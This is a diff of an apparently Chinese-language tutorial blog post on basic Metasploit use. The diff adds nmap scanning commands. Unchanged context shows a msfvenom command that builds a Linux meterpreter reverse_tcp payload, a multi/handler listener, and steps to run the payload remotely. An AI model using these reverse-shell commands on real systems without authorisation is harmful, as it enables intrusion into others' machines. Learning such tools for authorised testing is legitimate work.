@@ -2,7 +2,7 @@
 title: Metasploit 基本使用
 date: 2024-06-01 20:10:00
 categories: Security
-tags: [Security, Metasploit]
+tags: [Security, Metasploit, Nmap]
 ---
 
 <!-- 設定檔位置: ~/.msf4 -->
@@ -25,15 +25,34 @@ db_status
 
 # nmap 掃描
 ```bash
-# 基礎掃描
+# 網段主機掃描
+db_nmap -sn [CIDR網段]
+
+# 所有端口
+db_nmap [IP] -p-
+
+# 指定端口
+db_nmap [IP] -p [端口]
+db_nmap [IP] -p [起始端口]-[結束端口]
+db_nmap [IP] -p [端口1],[端口2]
+
+# 基礎服務掃描
 db_nmap -sV -p- [IP]
+
+# OS 識別
+db_nmap [IP] -p [端口] -O
 
 # 基礎漏洞掃描
 db_nmap -sV --script vulners [IP]
 
 # vulners.com 線上漏洞掃描
 db_nmap -sV --script vulners [IP]
+
+# 掃描結果導出
+db_nmap [IP] -p [端口] -oN result.txt
+db_nmap [IP] -p [端口] -oX result.xml
 ```
+
 # 模組操作
 ⭐ 更新可用模組
 ```bash
@@ -86,9 +105,8 @@ exploit
 
 # payload 基本操作
 
-⭐ 用途介紹
-
-| 用途      | 說明  |
+⭐ 接口介紹
+| 接口      | 說明  |
 | :------- | :---- |
 | command shell | 獲得一個命令行界面，允許攻擊者在目標系統上執行命令   |
 | meterpreter | 一種高級的、擴展性強的 payload，提供了豐富的功能，例如文件操作、過程管理、網絡偵查等 |
@@ -99,7 +117,7 @@ exploit
 msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=[監聽機IP位置] LPORT=[監聽機端口] -f elf -o payload.elf
 ```
 
-⭐ 監聽 payload ，等待遠端執行 payload
+⭐ 啟動監聽服務，等待遠端執行 meterpreter payload
 ```bash
 use exploit/multi/handler
 set payload linux/x86/meterpreter/reverse_tcp
@@ -108,7 +126,7 @@ set LPORT [監聽機端口]
 exploit
 ```
 
-⭐ 遠端執行 payload
+⭐ 遠端執行 meterpreter payload
 ```bash
 # 給予執行權限
 chmod +x payload.elf
